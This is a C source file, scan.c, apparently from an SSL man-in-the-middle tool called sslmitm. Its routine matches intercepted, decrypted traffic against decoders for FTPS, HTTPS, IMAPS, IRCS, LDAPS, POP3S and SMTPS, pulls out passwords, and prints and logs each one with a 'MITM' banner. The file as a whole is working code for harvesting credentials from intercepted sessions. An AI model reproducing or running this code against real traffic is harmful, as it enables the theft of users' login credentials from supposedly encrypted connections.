/*
 *  Copyright (c) 2004 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * $Id: scan.c,v 1.3 2005-07-08 13:36:59 cmn Exp $
 */

#ifndef NO_PASSWD_SCAN

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include "sslmitm.h"

extern struct options opt;

/* Scan routines */
struct scanfunc {
	int port;
	int (*func)(u_int8_t *, size_t, u_int8_t *, size_t);
	char *name;
};

/*
 * Crappy O(n) when scanning for service with a given port
 * TODO: Arrange services by port number in a binary tree 
 */

struct scanfunc ssl_protos[] =
{
	{ 990, decode_ftp, "ftps"},
	{ 443, decode_http, "https"},
	{ 993, decode_imap, "imaps"},
	{ 994, decode_irc, "ircs"},
	{ 636, decode_ldap, "ldaps"},
	{ 995, decode_pop, "pops"},
	{ 465, decode_smtp, "smtps"},
	{-1, NULL}
};


/*
 * Scan buffer for password
 */
void
scan_buffer(time_t ts, FILE *logf, u_int saddr, u_short sport, 
		u_int daddr, u_short dport, u_int8_t *buf, size_t buflen)
{
    u_int8_t buf1[2048];
    u_int8_t buf2[2048];
	u_int8_t *pbuf;
	u_int len;
	int i;

	/* Scan all protocols */
	for (i=0; ssl_protos[i].func != NULL; i++) {	

		if (dport != ntohs(ssl_protos[i].port))
			continue;

		verbose(3, "Scanning proto %s for password [buffer is %u bytes]\n", 
			ssl_protos[i].name, buflen);
		
		/* Since some routines edit the payload buffer we copy
		 * it to keep the packet in its original state
		 * ugly, but it works for now.
		 * TODO: Rewrite decode routines not to edit packets */
		pbuf = zmemx(buflen+1);
		memcpy(pbuf, buf, buflen);
		
		if (ssl_protos[i].func(pbuf, buflen, buf1, sizeof(buf1)-1) != 0) {
			const char *pt1;
			const char *pt2;

			/* Banner */
			pt1 = net_sockstr_ip(saddr, sport, opt.resolve);
			pt2 = net_sockstr_ip(daddr, dport, opt.resolve);
		    snprintf((char *)buf2, sizeof(buf2), "[%s] MITM (%s) %s -> %s", str_time(ts, NULL),
				ssl_protos[i].name, pt1, pt2);
			free((char *)pt1);
			free((char *)pt2);

			len = strlen((char *)buf1);
			if ((len >= 1) && (buf[len-1] == '\n'))
				buf[len-1] = '\0';	
			if ((len >= 2) && (buf[len-2] == '\r'))
				buf[len-2] = '\0';	
			
            printf("\n%s\n%s\n\n", buf2, buf1);
			
			if (logf != NULL) {
				fprintf(logf, "%s\n%s\n\n", buf2, buf1);
				fflush(logf);
			}
		}

		free(pbuf);
	}
}

#endif
